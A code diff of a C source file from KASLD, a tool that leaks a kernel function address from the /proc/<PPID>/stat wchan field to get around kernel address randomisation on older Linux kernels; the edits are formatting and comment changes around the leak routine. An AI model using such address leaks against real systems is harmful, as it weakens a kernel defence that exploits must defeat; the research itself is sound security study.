@@ -1,9 +1,12 @@
 // This file is part of KASLD - https://github.com/bcoles/kasld
+//
 // Leak the parent process waiting kernel function virtual address
 // from /proc/<PPID>/stat wait channel 'wchan' field. Patched late 2015.
-// - https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b2f73922d119686323f14fbbe46587f863852328
-// - https://www.cr0.org/paper/to-jt-linux-alsr-leak.pdf
-// - https://marcograss.github.io/security/linux/2016/01/24/exploiting-infoleak-linux-kaslr-bypass.html
+//
+// References:
+// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b2f73922d119686323f14fbbe46587f863852328
+// https://www.cr0.org/paper/to-jt-linux-alsr-leak.pdf
+// https://marcograss.github.io/security/linux/2016/01/24/exploiting-infoleak-linux-kaslr-bypass.html
 // ---
 // <bcoles@gmail.com>
 
@@ -55,7 +58,7 @@ unsigned long get_kernel_addr_proc_stat_wchan() {
 
   char *ptr = strtok(buff, delim);
   while ((ptr = strtok(NULL, delim)) != NULL) {
-    char* endptr = &ptr[strlen(ptr)];
+    char *endptr = &ptr[strlen(ptr)];
     addr = (unsigned long)strtoull(&ptr[0], &endptr, 10);
 
     if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
@@ -69,7 +72,7 @@ unsigned long get_kernel_addr_proc_stat_wchan() {
   return addr;
 }
 
-int main (int argc, char **argv) {
+int main(int argc, char **argv) {
   struct utsname u = get_kernel_version();
 
   /* this technique should also work on 32-bit. lazy */
@@ -79,7 +82,8 @@ int main (int argc, char **argv) {
   }
 
   unsigned long addr = get_kernel_addr_proc_stat_wchan();
-  if (!addr) return 1;
+  if (!addr)
+    return 1;
 
   printf("leaked wchan address: %lx\n", addr);
 
@@ -92,4 +96,3 @@ int main (int argc, char **argv) {
 
   return 0;
 }
-
